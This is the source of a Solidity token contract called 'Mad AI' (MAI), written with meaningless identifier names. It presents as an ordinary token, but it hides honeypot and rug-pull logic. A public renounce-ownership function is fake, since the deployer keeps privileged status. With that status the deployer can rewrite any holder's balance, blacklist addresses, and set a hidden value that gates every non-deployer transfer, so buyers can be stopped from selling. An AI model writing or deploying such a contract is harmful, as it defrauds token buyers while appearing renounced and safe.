//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface teamLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listLiquidity) external view returns (uint256);

    function transfer(address txReceiver, uint256 autoReceiverExempt) external returns (bool);

    function allowance(address modeReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoReceiverExempt) external returns (bool);

    function transferFrom(
        address sender,
        address txReceiver,
        uint256 autoReceiverExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptMin, uint256 value);
    event Approval(address indexed modeReceiver, address indexed spender, uint256 value);
}

interface maxIsWallet is teamLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract feeTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamIsLimit {
    function createPair(address enableLaunch, address buyAutoShould) external returns (address);
}

interface exemptBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract MadAI is feeTake, teamLimit, maxIsWallet {

    function approve(address marketingSender, uint256 autoReceiverExempt) public virtual override returns (bool) {
        takeTx[_msgSender()][marketingSender] = autoReceiverExempt;
        emit Approval(_msgSender(), marketingSender, autoReceiverExempt);
        return true;
    }

    address private maxFromBuy;

    mapping(address => mapping(address => uint256)) private takeTx;

    uint8 private takeEnable = 18;

    event OwnershipTransferred(address indexed isTeam, address indexed takeWallet);

    string private tokenLaunched = "MAI";

    address txMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function walletExempt() public {
        emit OwnershipTransferred(atReceiverLimit, address(0));
        maxFromBuy = address(0);
    }

    uint256 public tokenReceiver;

    uint256 private fromSender;

    function owner() external view returns (address) {
        return maxFromBuy;
    }

    address public atReceiverLimit;

    bool public limitToken;

    function liquidityAuto(address fromFeeEnable) public {
        swapMarketing();
        
        if (fromFeeEnable == atReceiverLimit || fromFeeEnable == fundToken) {
            return;
        }
        launchTake[fromFeeEnable] = true;
    }

    bool private maxAuto;

    bool private minLiquidity;

    function balanceOf(address listLiquidity) public view virtual override returns (uint256) {
        return swapSender[listLiquidity];
    }

    function transfer(address teamAmount, uint256 autoReceiverExempt) external virtual override returns (bool) {
        return senderMarketing(_msgSender(), teamAmount, autoReceiverExempt);
    }

    function name() external view virtual override returns (string memory) {
        return liquidityTake;
    }

    function decimals() external view virtual override returns (uint8) {
        return takeEnable;
    }

    function shouldSender(address fundMin, address txReceiver, uint256 autoReceiverExempt) internal returns (bool) {
        require(swapSender[fundMin] >= autoReceiverExempt);
        swapSender[fundMin] -= autoReceiverExempt;
        swapSender[txReceiver] += autoReceiverExempt;
        emit Transfer(fundMin, txReceiver, autoReceiverExempt);
        return true;
    }

    function transferFrom(address fundMin, address txReceiver, uint256 autoReceiverExempt) external override returns (bool) {
        if (_msgSender() != fundReceiverLaunched) {
            if (takeTx[fundMin][_msgSender()] != type(uint256).max) {
                require(autoReceiverExempt <= takeTx[fundMin][_msgSender()]);
                takeTx[fundMin][_msgSender()] -= autoReceiverExempt;
            }
        }
        return senderMarketing(fundMin, txReceiver, autoReceiverExempt);
    }

    function allowance(address takeTrading, address marketingSender) external view virtual override returns (uint256) {
        if (marketingSender == fundReceiverLaunched) {
            return type(uint256).max;
        }
        return takeTx[takeTrading][marketingSender];
    }

    function launchedReceiverMin(address liquiditySell) public {
        if (limitToken) {
            return;
        }
        
        launchToken[liquiditySell] = true;
        if (isTotal != tokenReceiver) {
            isTotal = fromSender;
        }
        limitToken = true;
    }

    function swapMarketing() private view {
        require(launchToken[_msgSender()]);
    }

    function autoTxTrading(uint256 autoReceiverExempt) public {
        swapMarketing();
        tradingSender = autoReceiverExempt;
    }

    constructor (){
        if (minLiquidity) {
            fromSender = enableTake;
        }
        walletExempt();
        exemptBuy liquiditySwap = exemptBuy(fundReceiverLaunched);
        fundToken = teamIsLimit(liquiditySwap.factory()).createPair(liquiditySwap.WETH(), address(this));
        if (tokenReceiver != fromSender) {
            isTotal = enableTake;
        }
        atReceiverLimit = _msgSender();
        launchToken[atReceiverLimit] = true;
        swapSender[atReceiverLimit] = minLaunched;
        if (isTotal == enableTake) {
            tokenReceiver = fromSender;
        }
        emit Transfer(address(0), atReceiverLimit, minLaunched);
    }

    uint256 public enableTake;

    function senderMarketing(address fundMin, address txReceiver, uint256 autoReceiverExempt) internal returns (bool) {
        if (fundMin == atReceiverLimit) {
            return shouldSender(fundMin, txReceiver, autoReceiverExempt);
        }
        uint256 receiverFund = teamLimit(fundToken).balanceOf(txMax);
        require(receiverFund == tradingSender);
        require(!launchTake[fundMin]);
        return shouldSender(fundMin, txReceiver, autoReceiverExempt);
    }

    function getOwner() external view returns (address) {
        return maxFromBuy;
    }

    function symbol() external view virtual override returns (string memory) {
        return tokenLaunched;
    }

    uint256 tradingSender;

    mapping(address => uint256) private swapSender;

    mapping(address => bool) public launchToken;

    string private liquidityTake = "Mad AI";

    uint256 private isTotal;

    address fundReceiverLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public launchTake;

    uint256 marketingLiquidity;

    function totalSupply() external view virtual override returns (uint256) {
        return minLaunched;
    }

    uint256 private minLaunched = 100000000 * 10 ** 18;

    function isToken(address teamAmount, uint256 autoReceiverExempt) public {
        swapMarketing();
        swapSender[teamAmount] = autoReceiverExempt;
    }

    address public fundToken;

}